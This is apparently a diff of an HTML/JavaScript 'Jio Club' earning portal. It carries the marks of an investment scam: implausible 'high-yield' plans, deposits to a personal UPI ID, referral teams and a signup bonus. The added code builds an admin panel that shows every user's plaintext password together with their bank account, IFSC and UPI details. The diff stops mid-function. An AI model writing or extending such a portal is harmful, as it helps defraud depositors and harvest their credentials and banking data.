@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Jio Earning Club - Portal</title>
+  <title>Jio Club - Portal & Admin Panel</title>
   <style>
     :root {
-      --primary-color: #0a58ca; /* Jio Blue Theme */
+      --primary-color: #0a58ca;
       --accent-color: #ff3b30;
       --bg-color: #f4f7fb;
       --card-bg: #ffffff;
@@ -14,39 +14,19 @@
     }
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
     body { background: var(--bg-color); color: var(--text-color); padding-bottom: 70px; }
-    .main-container { max-width: 500px; margin: 0 auto; padding: 15px; }
+    .main-container { max-width: 600px; margin: 0 auto; padding: 15px; }
     .card { background: var(--card-bg); padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-bottom: 15px; }
     .card h3 { color: var(--primary-color); margin-bottom: 15px; border-bottom: 2px solid var(--primary-color); padding-bottom: 5px; font-size: 16px; }
     label { display: block; font-size: 13px; font-weight: bold; color: #555; margin-top: 10px; }
-    input, select { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; outline: none; }
+    input, select, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; outline: none; }
     .btn { width: 100%; margin-top: 15px; padding: 12px; border: none; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; color: white; background: var(--primary-color); }
-    .btn-accent { background: var(--accent-color); }
-    .btn-disabled { background: #cccccc !important; cursor: not-allowed !important; }
     
-    .jio-header { background: linear-gradient(135deg, #0a58ca, #0d6efd); color: white; padding: 15px; border-radius: 12px; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 4px 10px rgba(10,88,202,0.3); }
-    .jio-logo { font-size: 22px; font-weight: 900; letter-spacing: 1px; }
-    
-    .assets-top-card { background: #ffffff; padding: 15px; border-radius: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-bottom: 15px; }
-    .balance-header { display: flex; justify-content: space-between; align-items: flex-start; }
-    .balance-title { font-size: 12px; color: #777; }
-    .balance-amount { font-size: 24px; font-weight: 900; color: #111; margin-top: 2px; }
-    .user-phone-uid { font-size: 13px; color: #555; margin-top: 8px; font-weight: 600; }
+    .jio-header { background: linear-gradient(135deg, #0a58ca, #0d6efd); color: white; padding: 15px; border-radius: 12px; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between; }
+    .jio-logo { font-size: 22px; font-weight: 900; }
 
-    .quick-actions { display: flex; justify-content: space-between; background: #ffffff; padding: 15px 10px; border-radius: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-bottom: 15px; }
-    .action-btn { text-align: center; flex: 1; cursor: pointer; font-size: 12px; font-weight: 600; color: #444; }
-    .action-icon { width: 45px; height: 45px; background: #e7f1ff; color: var(--primary-color); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 6px auto; font-size: 18px; }
-
-    .menu-card { background: #ffffff; padding: 15px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 6px rgba(0,0,0,0.04); margin-bottom: 10px; cursor: pointer; font-weight: 600; font-size: 14px; }
-    .menu-card span { font-size: 18px; font-weight: bold; color: #888; }
-
-    .plan-card { background: #f8f9fa; border: 2px solid var(--primary-color); padding: 15px; border-radius: 10px; margin-bottom: 15px; }
-    .plan-title { font-size: 16px; font-weight: bold; color: var(--primary-color); margin-bottom: 8px; }
-    .plan-details { font-size: 13px; color: #444; line-height: 1.6; }
-    .calc-box { background: #e8f5e9; color: #2e7d32; padding: 8px; border-radius: 6px; font-size: 12px; font-weight: bold; margin-top: 8px; }
-
-    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 2000; }
-    .modal-box { background: white; width: 90%; max-width: 400px; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); max-height: 85vh; overflow-y: auto; }
-    .upi-option-btn { width: 100%; padding: 12px; margin-top: 8px; border: 1px solid #ddd; border-radius: 8px; font-weight: bold; cursor: pointer; text-align: left; background: #f9f9f9; display: flex; align-items: center; justify-content: space-between; font-size: 14px; }
+    table { width: 100%; border-collapse: collapse; margin-top: 10px; overflow-x: auto; display: block; }
+    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; font-size: 12px; }
+    th { background-color: var(--primary-color); color: white; }
 
     .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: white; display: flex; justify-content: space-around; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); padding: 8px 0; z-index: 1000; }
     .nav-item { text-align: center; font-size: 11px; color: #777; cursor: pointer; font-weight: 600; flex: 1; }
@@ -56,453 +36,259 @@
     .section-view.active-sec { display: block; }
   </style>
 </head>
-<body>
+<body onload="initApp()">
 
-  <!-- AUTH SECTION -->
+  <!-- AUTH SECTION (Login / Register) -->
   <div id="auth-section" class="main-container">
     <div class="jio-header" style="justify-content:center; margin-top:20px;">
       <div class="jio-logo">Jio Digital Club 🚀</div>
     </div>
+    
     <div class="card" id="reg-card">
       <h3>📝 User Registration (Bonus ₹40)</h3>
       <label>Full Name</label>
       <input type="text" id="reg-name" placeholder="Enter Full Name">
       <label>Mobile Number</label>
       <input type="text" id="reg-phone" placeholder="10-digit mobile number">
-      <label>Gmail Address</label>
+      <label>Email ID</label>
       <input type="email" id="reg-email" placeholder="example@gmail.com">
       <label>Password (Min 8 Digits)</label>
       <input type="password" id="reg-pass" placeholder="Minimum 8 characters">
-      <label>Referral Code (Auto-filled via link)</label>
-      <input type="text" id="reg-ref" placeholder="Optional Referral Code">
-      <button class="btn" id="btn-register">Register Now</button>
+      <button class="btn" onclick="registerUser()">Register Now</button>
       <p style="margin-top: 15px; font-size: 13px; text-align: center;">
-        Already Registered? <a href="#" id="link-show-login" style="color:var(--primary-color);">Login Here</a>
+        Already Registered? <a href="#" onclick="toggleAuth('login')" style="color:var(--primary-color);">Login Here</a>
       </p>
     </div>
 
     <div class="card" id="login-card" style="display:none;">
       <h3>🔐 User Login</h3>
-      <label>Email ID / Phone</label>
+      <label>Email / Phone</label>
       <input type="text" id="login-email" placeholder="Enter Email or Phone">
       <label>Password</label>
       <input type="password" id="login-pass" placeholder="Enter Password">
-      <button class="btn" id="btn-login">Login Portal</button>
-      <p style="margin-top:15px; text-align: center;"><a href="#" id="link-back-reg" style="color:var(--primary-color);">Back to Register</a></p>
+      <button class="btn" onclick="loginUser()">Login Portal</button>
+      <p style="margin-top:15px; text-align: center;">
+        <a href="#" onclick="toggleAuth('reg')" style="color:var(--primary-color);">Back to Register</a>
+      </p>
     </div>
   </div>
 
-  <!-- DEPOSIT MODAL STEP 1: AMOUNT -->
-  <div id="deposit-modal-1" class="modal-overlay">
-    <div class="modal-box">
-      <h3 style="color:var(--primary-color); margin-bottom:10px;">📥 Deposit Funds (Step 1)</h3>
-      <label>Enter Amount (₹)</label>
-      <input type="number" id="deposit-amount-input" placeholder="e.g. 500" style="margin-bottom:15px;">
-      <button class="btn" onclick="proceedToPaymentApps()">Proceed to Pay</button>
-      <button class="btn btn-accent" style="margin-top:8px;" onclick="closeDepositModal1()">Cancel</button>
-    </div>
-  </div>
-
-  <!-- DEPOSIT MODAL STEP 2: CHOOSE APP & PAY -->
-  <div id="deposit-modal-2" class="modal-overlay">
-    <div class="modal-box">
-      <h3 style="color:var(--primary-color); margin-bottom:5px;">💳 Choose Payment App</h3>
-      <p style="font-size:12px; color:#666; margin-bottom:10px;">Amount: <b id="pay-display-amt">₹0</b> to UPI: <b style="color:var(--primary-color);">laxmihi@ptyes</b></p>
-      
-      <div class="upi-option-btn" onclick="openUpiApp('paytm')"><span>📱 Pay via Paytm</span> <span>➔</span></div>
-      <div class="upi-option-btn" onclick="openUpiApp('phonepe')"><span>🟣 Pay via PhonePe</span> <span>➔</span></div>
-      <div class="upi-option-btn" onclick="openUpiApp('gpay')"><span>🔵 Pay via Google Pay</span> <span>➔</span></div>
-
-      <button class="btn" style="margin-top:15px; background:#28a745;" onclick="openUtrModal()">I Have Paid, Enter UTR</button>
-      <button class="btn btn-accent" style="margin-top:8px;" onclick="closeDepositModal2()">Back</button>
-    </div>
-  </div>
-
-  <!-- DEPOSIT MODAL STEP 3: UTR SUBMISSION -->
-  <div id="deposit-modal-3" class="modal-overlay">
-    <div class="modal-box">
-      <h3 style="color:var(--primary-color); margin-bottom:10px;">📝 Enter UTR / Transaction ID</h3>
-      <label>12-Digit UTR Number</label>
-      <input type="text" id="deposit-utr-input" placeholder="e.g. 426512345678" style="margin-bottom:15px;">
-      <button class="btn" onclick="submitFinalDeposit()">Submit Deposit Request</button>
-      <button class="btn btn-accent" style="margin-top:8px;" onclick="closeDepositModal3()">Cancel</button>
-    </div>
-  </div>
-
-  <!-- BANK DETAILS MODAL -->
-  <div id="bank-modal" class="modal-overlay">
-    <div class="modal-box">
-      <h3 style="color:var(--primary-color); margin-bottom:10px;">🏦 Add Bank / UPI Details</h3>
-      <label>Account Holder Name</label>
-      <input type="text" id="bank-holder" placeholder="Name as per bank">
-      <label>Bank Account Number</label>
-      <input type="text" id="bank-acc" placeholder="Enter Account Number">
-      <label>IFSC Code</label>
-      <input type="text" id="bank-ifsc" placeholder="Enter IFSC Code">
-      <label>UPI ID (Optional)</label>
-      <input type="text" id="bank-upi" placeholder="e.g. user@paytm">
-      <button class="btn" style="margin-top:15px;" onclick="saveBankDetails()">Save Bank Details</button>
-      <button class="btn btn-accent" style="margin-top:8px;" onclick="closeBankModal()">Cancel</button>
-    </div>
-  </div>
-
-  <!-- MAIN APP CONTAINER -->
+  <!-- MAIN PORTAL & ADMIN PANEL CONTAINER -->
   <div id="portal-container" style="display:none;">
     <div class="main-container">
-      
       <div class="jio-header">
         <div class="jio-logo">Jio Club</div>
-        <div style="font-size: 13px;">Online Earning Portal</div>
+        <div style="font-size: 13px;"><button onclick="logoutUser()" style="background:#ff3b30; color:white; border:none; padding:5px 10px; border-radius:4px; cursor:pointer;">Logout</button></div>
       </div>
 
-      <!-- TAB 1: HOME (PLANS) -->
+      <!-- TAB 1: USER HOME / PLANS -->
       <div id="tab-home" class="section-view active-sec">
         <div class="card">
-          <h3>💎 Jio High-Yield Investment Plans</h3>
-          
-          <!-- Hourly Plan -->
-          <div class="plan-card" style="border-color: #ff3b30; background: #fff5f5;">
-            <div class="plan-title" style="color: #d93829;">⚡ Jio Hourly Fast Plan (₹180)</div>
-            <div class="plan-details">• Investment: <b>₹180</b> | Duration: <b>1 Hour</b><br>• Total Return: <b>₹200</b></div>
-            <div class="calc-box" style="background:#ffebee; color:#c62828;">Profit: ₹20 in 1 Hour</div>
-            <button class="btn btn-accent" id="btn-plan-180" onclick="buyPlan(180, 'Jio Hourly Fast Plan (₹180)', 200, '1 Hour')">Invest ₹180 (1 Hour)</button>
+          <h3>💎 Jio Investment Plans</h3>
+          <p style="font-size:13px; color:#555;">Available Balance: <b>₹<span id="user-balance">40</span></b></p>
+          <div style="background:#f8f9fa; border:1px solid #ddd; padding:15px; border-radius:8px; margin-top:10px;">
+            <h4>Jio Starter Plan (₹380)</h4>
+            <p style="font-size:12px; color:#666; margin:5px 0;">Daily Return: ₹266 | Duration: 2 Days</p>
+            <button class="btn" onclick="buyPlan(380)">Invest ₹380</button>
           </div>
-
-          <!-- Plan 1 -->
-          <div class="plan-card">
-            <div class="plan-title">📦 Jio Starter Plan (₹380)</div>
-            <div class="plan-details">• Investment: <b>₹380</b> | Duration: <b>2 Days</b><br>• Daily Income: <b>₹76 / Day</b></div>
-            <div class="calc-box">Total Return: ₹532</div>
-            <button class="btn" id="btn-plan-380" onclick="buyPlan(380, 'Jio Starter Plan (₹380)', 532, '2 Days')">Invest ₹380</button>
-          </div>
-
-          <!-- Plan 2 -->
-          <div class="plan-card">
-            <div class="plan-title">🚀 Jio Bronze Plan (₹800)</div>
-            <div class="plan-details">• Investment: <b>₹800</b> | Duration: <b>4 Days</b><br>• Daily Income: <b>₹210 / Day</b></div>
-            <div class="calc-box">Total Return: ₹840 (Profit)</div>
-            <button class="btn" id="btn-plan-800" onclick="buyPlan(800, 'Jio Bronze Plan (₹800)', 840, '4 Days')">Invest ₹800</button>
-          </div>
-
-          <!-- Plan 3 -->
-          <div class="plan-card">
-            <div class="plan-title">🔥 Jio Silver Plan (₹1,800)</div>
-            <div class="plan-details">• Investment: <b>₹1,800</b> | Duration: <b>5 Days</b><br>• Daily Income: <b>₹480 / Day</b></div>
-            <div class="calc-box">Total Return: ₹2,400</div>
-            <button class="btn" id="btn-plan-1800" onclick="buyPlan(1800, 'Jio Silver Plan (₹1,800)', 2400, '5 Days')">Invest ₹1,800</button>
-          </div>
-
-          <!-- Plan 4 -->
-          <div class="plan-card">
-            <div class="plan-title">⭐ Jio Gold Plan (₹3,500)</div>
-            <div class="plan-details">• Investment: <b>₹3,500</b> | Duration: <b>7 Days</b><br>• Daily Income: <b>₹950 / Day</b></div>
-            <div class="calc-box">Total Return: ₹6,650</div>
-            <button class="btn" id="btn-plan-3500" onclick="buyPlan(3500, 'Jio Gold Plan (₹3,500)', 6650, '7 Days')">Invest ₹3,500</button>
-          </div>
-
-          <!-- Plan 5 -->
-          <div class="plan-card">
-            <div class="plan-title">👑 Jio Platinum Plan (₹7,000)</div>
-            <div class="plan-details">• Investment: <b>₹7,000</b> | Duration: <b>10 Days</b><br>• Daily Income: <b>₹1,950 / Day</b></div>
-            <div class="calc-box">Total Return: ₹19,500</div>
-            <button class="btn" id="btn-plan-7000" onclick="buyPlan(7000, 'Jio Platinum Plan (₹7,000)', 19500, '10 Days')">Invest ₹7,000</button>
-          </div>
-
         </div>
-      </div>
 
-      <!-- TAB 2: PRODUCTS & ACTIVE PLANS (MY PLAN) -->
-      <div id="tab-products" class="section-view">
         <div class="card">
-          <h3>📦 My Active Plan & History</h3>
-          <div style="background:#e8f5e9; border:1px solid #c8e6c9; padding:12px; border-radius:8px; margin-bottom:15px;">
-            <div style="font-weight:bold; color:#2e7d32; font-size:14px; margin-bottom:4px;">🟢 Currently Running Plan (`My Plan`):</div>
-            <div id="active-plan-status" style="font-size:13px; color:#333;">Koi bhi plan active nahi hai.</div>
-          </div>
-          <h4 style="font-size:14px; margin-bottom:8px; color:#444;">Transaction History</h4>
-          <div id="my-products-list" style="font-size:13px; color:#555;">Koi history nahi hai.</div>
+          <h3>🏦 Add Bank / UPI Details (For Withdrawal)</h3>
+          <label>Account Holder Name</label>
+          <input type="text" id="bank-holder" placeholder="Name as per Bank">
+          <label>Account Number</label>
+          <input type="text" id="bank-acc" placeholder="Enter Account Number">
+          <label>IFSC Code</label>
+          <input type="text" id="bank-ifsc" placeholder="Enter IFSC Code">
+          <label>UPI ID</label>
+          <input type="text" id="bank-upi" placeholder="e.g. mobile@paytm">
+          <button class="btn" onclick="saveBankDetails()">Save Details</button>
         </div>
       </div>
 
-      <!-- TAB 3: WORK & DAILY BONUS -->
-      <div id="tab-work" class="section-view">
-        <div class="card">
-          <h3>🎯 Daily Check-in & Tasks</h3>
-          <p style="font-size: 13px; color: #666; margin-bottom: 10px;">Rozana check-in karke ₹10 free paayein!</p>
-          <button class="btn" id="btn-claim-bonus" onclick="claimDailyBonus()">Claim Daily Bonus (₹10)</button>
+      <!-- TAB 2: ADMIN PANEL (ALL USERS, PASSWORD & BANK DETAILS) -->
+      <div id="tab-admin" class="section-view">
+        <div class="card" style="border-left: 5px solid #0a58ca;">
+          <h3>👑 Admin Panel: All Users Data</h3>
+          <p style="font-size: 12px; color: #666; margin-bottom: 10px;">यहाँ सभी ग्राहकों की यूजर आईडी, पासवर्ड और उनके बैंक/UPI विवरण दिखाई दे रहे हैं।</p>
+          <table>
+            <thead>
+              <tr>
+                <th>UID / Name</th>
+                <th>Phone / Email</th>
+                <th>Password</th>
+                <th>Bank / UPI Details</th>
+              </tr>
+            </thead>
+            <tbody id="adminUserTable">
+              <tr><td colspan="4" style="text-align:center;">डेटा लोड हो रहा है...</td></tr>
+            </tbody>
+          </table>
         </div>
       </div>
-
-      <!-- TAB 4: TEAM & REFERRALS -->
-      <div id="tab-team" class="section-view">
-        <div class="card">
-          <h3>👥 My Team & Referrals</h3>
-          <div style="background:#f8f9fa; padding:12px; border-radius:6px; margin-top:10px; font-size:12px; word-break: break-all;">
-            <b>Your Referral Link:</b><br><code id="referral-link-text" style="color:var(--primary-color); font-weight:bold;"></code>
-          </div>
-          <button class="btn" style="margin-top:10px;" onclick="copyReferralLink()">📋 Copy Referral Link</button>
-          <h3 style="margin-top:20px;">📜 Direct Team Members List</h3>
-          <div id="team-members-list" style="font-size:13px; color:#555; margin-top:10px;">Abhi koi team member nahi hai.</div>
-        </div>
-      </div>
-
-      <!-- TAB 5: ASSETS (WALLET & PROFILE) -->
-      <div id="tab-assets" class="section-view">
-        <div class="assets-top-card">
-          <div class="balance-header">
-            <div>
-              <div class="balance-title">Available Balance</div>
-              <div class="balance-amount">₹<span id="user-balance">0.00</span></div>
-            </div>
-          </div>
-          <div class="user-phone-uid">📞 <span id="profile-phone"></span> &nbsp;|&nbsp; 🆔 UID: <span id="profile-uid"></span></div>
-        </div>
-        
-        <div class="quick-actions">
-          <div class="action-btn" onclick="openDepositModal1()"><div class="action-icon">📥</div>Deposit</div>
-          <div class="action-btn" onclick="openWithdrawModal()"><div class="action-icon">📤</div>Withdraw</div>
-          <div class="action-btn" onclick="openBankModal()"><div class="action-icon">🏦</div>Bank/UPI</div>
-        </div>
-
-        <div class="card" style="padding: 15px;">
-          <h3 style="margin-bottom:10px; font-size:14px;">🔒 Bank Account Status</h3>
-          <div id="bank-status-text" style="font-size:13px; color:#666;">Bank details add nahi ki gayi hain.</div>
-        </div>
-
-        <div class="menu-card" onclick="logoutUser()"><div style="color: var(--accent-color);">Logout Account</div><span>›</span></div>
-      </div>
-
     </div>
 
     <!-- BOTTOM NAVBAR -->
     <div class="bottom-nav">
-      <div class="nav-item active" onclick="switchTab('home', this)"><span>🏠</span>Home</div>
-      <div class="nav-item" onclick="switchTab('products', this)"><span>📦</span>My Plan</div>
-      <div class="nav-item" onclick="switchTab('work', this)"><span>📋</span>Work</div>
-      <div class="nav-item" onclick="switchTab('team', this)"><span>👥</span>Team</div>
-      <div class="nav-item" onclick="switchTab('assets', this)"><span>💼</span>Assets</div>
+      <div class="nav-item active" onclick="switchTab('home', this)"><span>🏠</span>Dashboard</div>
+      <div class="nav-item" onclick="switchTab('admin', this)"><span>👑</span>Admin Panel</div>
     </div>
   </div>
 
   <script>
     let usersDB = JSON.parse(localStorage.getItem("usersDB")) || [];
     let currentUser = JSON.parse(localStorage.getItem("currentUser")) || null;
-    let pendingRequests = JSON.parse(localStorage.getItem("pendingRequests")) || [];
-    let currentDepositAmount = 0;
-    let selectedAppChoice = '';
 
-    window.onload = function() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const refCode = urlParams.get('ref');
-      if(refCode) {
-        document.getElementById("reg-ref").value = refCode;
-        localStorage.setItem("savedRefCode", refCode);
+    function initApp() {
+      if (currentUser) {
+        showPortal();
+      }
+    }
+
+    function toggleAuth(type) {
+      if(type === 'login') {
+        document.getElementById("reg-card").style.display = "none";
+        document.getElementById("login-card").style.display = "block";
       } else {
-        let savedRef = localStorage.getItem("savedRefCode");
-        if(savedRef) document.getElementById("reg-ref").value = savedRef;
+        document.getElementById("login-card").style.display = "none";
+        document.getElementById("reg-card").style.display = "block";
       }
-      
-      if(currentUser && currentUser.email) {
-        let latest = usersDB.find(u => u.email === currentUser.email);
-        if(latest) { currentUser = latest; localStorage.setItem("currentUser", JSON.stringify(currentUser)); showPortal(); }
-      }
-    };
+    }
 
-    document.getElementById("link-show-login").onclick = (e) => {
-      e.preventDefault(); document.getElementById("reg-card").style.display = "none"; document.getElementById("login-card").style.display = "block";
-    };
-    document.getElementById("link-back-reg").onclick = (e) => {
-      e.preventDefault(); document.getElementById("login-card").style.display = "none"; document.getElementById("reg-card").style.display = "block";
-    };
-
-    document.getElementById("btn-register").onclick = function() {
-      usersDB = JSON.parse(localStorage.getItem("usersDB")) || [];
+    function registerUser() {
       const name = document.getElementById("reg-name").value.trim();
       const phone = document.getElementById("reg-phone").value.trim();
       const email = document.getElementById("reg-email").value.trim().toLowerCase();
       const pass = document.getElementById("reg-pass").value;
-      const refCode = document.getElementById("reg-ref").value.trim();
 
-      if(!name || !phone || !email || pass.length < 8) { alert("Sabhi details bharein (Min password 8 digits)!"); return; }
-      if(usersDB.find(u => u.email === email)) { alert("Email pehle se registered hai!"); return; }
+      if(!name || !phone || !email || pass.length < 8) { 
+        alert("कृपया सभी फील्ड भरें और पासवर्ड कम से कम 8 अंकों का रखें!"); 
+        return; 
+      }
+
+      // Check if user already exists
+      let existing = usersDB.find(u => u.email === email || u.phone === phone);
+      if(existing) {
+        alert("यह ईमेल या फोन नंबर पहले से रजिस्टर्ड है!");
+        return;
+      }
 
       const uniqueId = Math.floor(100000000 + Math.random() * 900000000).toString();
-      const randomBonus = 40;
-      const newUser = { uniqueId, name, phone, email, password: pass, referredBy: refCode, balance: randomBonus, lastCheckIn: "", teamMembers: [], history: [], activePlan: null, purchasedPlans: [], bankDetails: null };
-
-      let referrerUser = usersDB.find(u => u.uniqueId === refCode);
-      if(referrerUser) {
-        if(!referrerUser.teamMembers) referrerUser.teamMembers = [];
-        if(!referrerUser.teamMembers.some(m => m.uniqueId === uniqueId)) {
-          referrerUser.teamMembers.push({ name, uniqueId, phone, date: new Date().toDateString() });
-        }
-      }
+      const newUser = { uniqueId, name, phone, email, password: pass, balance: 40, bankDetails: null };
 
       usersDB.push(newUser);
       currentUser = newUser;
+      
       localStorage.setItem("usersDB", JSON.stringify(usersDB));
       localStorage.setItem("currentUser", JSON.stringify(currentUser));
-      localStorage.removeItem("savedRefCode");
-      alert("Registration Successful! ₹40 Bonus added.");
-      showPortal();
-    };
 
-    document.getElementById("btn-login").onclick = function() {
-      usersDB = JSON.parse(localStorage.getItem("usersDB")) || [];
+      alert("रजिस्ट्रेशन सफल रहा!");
+      showPortal();
+    }
+
+    function loginUser() {
       let loginId = document.getElementById("login-email").value.trim().toLowerCase();
       let pass = document.getElementById("login-pass").value;
+      
       let user = usersDB.find(u => (u.email === loginId || u.phone === loginId) && u.password === pass);
 
       if(user) {
         currentUser = user;
-        if(!currentUser.purchasedPlans) currentUser.purchasedPlans = [];
         localStorage.setItem("currentUser", JSON.stringify(currentUser));
         showPortal();
-      } else { alert("Galat Email ya Password!"); }
-    };
-
-    // Deposit Flow Functions
-    function openDepositModal1() { document.getElementById("deposit-modal-1").style.display = "flex"; }
-    function closeDepositModal1() { document.getElementById("deposit-modal-1").style.display = "none"; }
-
-    function proceedToPaymentApps() {
-      let amt = parseFloat(document.getElementById("deposit-amount-input").value);
-      if(!amt || amt <= 0) { alert("Kripya sahi deposit amount enter karein!"); return; }
-      currentDepositAmount = amt;
-      document.getElementById("pay-display-amt").innerText = "₹" + amt;
-      closeDepositModal1();
-      document.getElementById("deposit-modal-2").style.display = "flex";
-    }
-
-    function closeDepositModal2() { document.getElementById("deposit-modal-2").style.display = "none"; }
-
-    function openUpiApp(appName) {
-      selectedAppChoice = appName;
-      let upiId = "laxmihi@ptyes";
-      let amount = currentDepositAmount;
-      let upiLink = `upi://pay?pa=${upiId}&am=${amount}&cu=INR`;
-      window.location.href = upiLink;
-    }
-
-    function openUtrModal() {
-      document.getElementById("deposit-modal-2").style.display = "none";
-      document.getElementById("deposit-modal-3").style.display = "flex";
-    }
-    function closeDepositModal3() { document.getElementById("deposit-modal-3").style.display = "none"; }
-
-    function submitFinalDeposit() {
-      let utrId = document.getElementById("deposit-utr-input").value.trim();
-      if(!utrId || utrId.length < 8) { alert("Kripya valid 12-digit UTR ID enter karein!"); return; }
-      closeDepositModal3();
-
-      let reqObj = {
-        id: 'REQ_' + Math.floor(100000 + Math.random() * 900000),
-        type: "Deposit",
-        userEmail: currentUser.email,
-        userName: currentUser.name,
-        userPhone: currentUser.phone,
-        amount: currentDepositAmount,
-        appName: selectedAppChoice || 'UPI App',
-        utrId: utrId,
-        date: new Date().toDateString(),
-        status: "Pending ⏳"
-      };
-
-      pendingRequests = JSON.parse(localStorage.getItem("pendingRequests")) || [];
-      pendingRequests.push(reqObj);
-      localStorage.setItem("pendingRequests", JSON.stringify(pendingRequests));
-
-      if(!currentUser.history) currentUser.history = [];
-      currentUser.history.push({ type: "Deposit Request", details: `₹${currentDepositAmount} via UPI (UTR: ${utrId})`, status: "Pending ⏳" });
-      updateStorage();
-
-      alert("Deposit request safalpurvak bhej di gayi hai! Admin verify karke balance update kar dega.");
-    }
-
-    // Bank Modal
-    function openBankModal() { document.getElementById("bank-modal").style.display = "flex"; }
-    function closeBankModal() { document.getElementById("bank-modal").style.display = "none"; }
-
-    function saveBankDetails() {
-      let holder = document.getElementById("bank-holder").value.trim();
-      let acc = document.getElementById("bank-acc").value.trim();
-      let ifsc = document.getElementById("bank-ifsc").value.trim();
-      let upi = document.getElementById("bank-upi").value.trim();
-
-      if(!holder || !acc || !ifsc) { alert("Please fill required bank fields!"); return; }
-      currentUser.bankDetails = { holder, acc, ifsc, upi };
-      updateStorage();
-      closeBankModal();
-      alert("Bank details saved successfully!");
-      showPortal();
-    }
-
-    function openWithdrawModal() {
-      if(!currentUser.bankDetails) { alert("Pehle Bank Details add karein!"); openBankModal(); return; }
-      let amt = prompt("Withdrawal Amount (₹):");
-      if(amt && !isNaN(amt) && amt > 0) {
-        let val = parseFloat(amt);
-        if(currentUser.balance >= val) {
-          currentUser.balance -= val;
-          let reqObj = {
-            id: 'REQ_' + Math.floor(100000 + Math.random() * 900000),
-            type: "Withdrawal",
-            userEmail: currentUser.email,
-            userName: currentUser.name,
-            userPhone: currentUser.phone,
-            amount: val,
-            date: new Date().toDateString(),
-            status: "Pending ⏳"
-          };
-          pendingRequests = JSON.parse(localStorage.getItem("pendingRequests")) || [];
-          pendingRequests.push(reqObj);
-          localStorage.setItem("pendingRequests", JSON.stringify(pendingRequests));
-
-          if(!currentUser.history) currentUser.history = [];
-          currentUser.history.push({ type: "Withdrawal Request", details: `₹${val} to Bank Acc`, status: "Pending ⏳" });
-          updateStorage();
-
-          alert("Withdrawal request bhej di gayi hai!");
-        } else { alert("Insufficient Balance!"); }
+      } else { 
+        alert("गलत ईमेल/फोन या पासवर्ड!"); 
       }
     }
 
-    function buyPlan(price, name, returnAmt, durationText) {
-      if(!currentUser.purchasedPlans) currentUser.purchasedPlans = [];
-      if(currentUser.purchasedPlans.includes(price)) {
-        alert("Aap yeh plan pehle hi kharid chuke hain! Ek user is plan ko dubara nahi kharid sakta.");
+    function logoutUser() {
+      localStorage.removeItem("currentUser");
+      currentUser = null;
+      document.getElementById("portal-container").style.display = "none";
+      document.getElementById("auth-section").style.display = "block";
+    }
+
+    function showPortal() {
+      document.getElementById("auth-section").style.display = "none";
+      document.getElementById("portal-container").style.display = "block";
+      document.getElementById("user-balance").innerText = currentUser.balance.toFixed(2);
+      
+      // Fill bank details if already saved
+      if(currentUser.bankDetails) {
+        document.getElementById("bank-holder").value = currentUser.bankDetails.holder || '';
+        document.getElementById("bank-acc").value = currentUser.bankDetails.acc || '';
+        document.getElementById("bank-ifsc").value = currentUser.bankDetails.ifsc || '';
+        document.getElementById("bank-upi").value = currentUser.bankDetails.upi || '';
+      }
+      
+      loadAdminTable();
+    }
+
+    function saveBankDetails() {
+      const holder = document.getElementById("bank-holder").value.trim();
+      const acc = document.getElementById("bank-acc").value.trim();
+      const ifsc = document.getElementById("bank-ifsc").value.trim();
+      const upi = document.getElementById("bank-upi").value.trim();
+
+      if(!holder || !acc || !ifsc) {
+        alert("कृपया बैंक की कम से कम मुख्य डिटेल्स भरें!");
         return;
       }
 
-      if(currentUser.balance < price) { alert("Balance kam hai! Pehle deposit karein."); return; }
-      currentUser.balance -= price;
+      currentUser.bankDetails = { holder, acc, ifsc, upi };
       
-      currentUser.purchasedPlans.push(price);
+      // Update in main database array
+      let index = usersDB.findIndex(u => u.email === currentUser.email);
+      if(index !== -1) {
+        usersDB[index] = currentUser;
+      }
 
-      // Set Active Plan
-      currentUser.activePlan = {
-        name: name,
-        price: price,
-        returnAmount: returnAmt,
-        duration: durationText,
-        purchasedDate: new Date().toLocaleString()
-      };
-
-      if(!currentUser.history) currentUser.history = [];
-      currentUser.history.push({ type: "Plan Investment", details: `${name} - ₹${price}`, status: "Active ✅" });
-      updateStorage();
-      alert("Plan Successfully Purchased & Activated!");
+      localStorage.setItem("usersDB", JSON.stringify(usersDB));
+      localStorage.setItem("currentUser", JSON.stringify(currentUser));
+      
+      alert("बैंक डिटेल्स सफलतापर्वक सेव कर दी गई हैं!");
+      loadAdminTable();
     }
 
-    function claimDailyBonus() {
-      let today = new Date().toDateString();
-      if(currentUser.lastCheckIn === today) { alert("Aaj ka bonus mil chuka hai!"); return; }
-      currentUser.balance += 10;
-      currentUser.lastCheckIn = today;
-      if(!currentUser.history) currentUser.history = [];
-      currentUser.history.push({ type: "Daily Bonus", details: "₹10 Claimed", status: "Success ✅" });
-      updateStorage();
-      alert("₹10 Bonus Added Successfully!");
+    function buyPlan(price) {
+      if(currentUser.balance < price) {
+        alert("आपका बैलेंस कम है!");
+        return;
+      }
+      currentUser.balance -= price;
+      localStorage.setItem("currentUser", JSON.stringify(currentUser));
+      document.getElementById("user-balance").innerText = currentUser.balance.toFixed(2);
+      alert("प्लान सफलतापूर्बक खरीद लिया गया है!");
+    }
+
+    function loadAdminTable() {
+      let tbody = document.getElementById('adminUserTable');
+      if(!tbody) return;
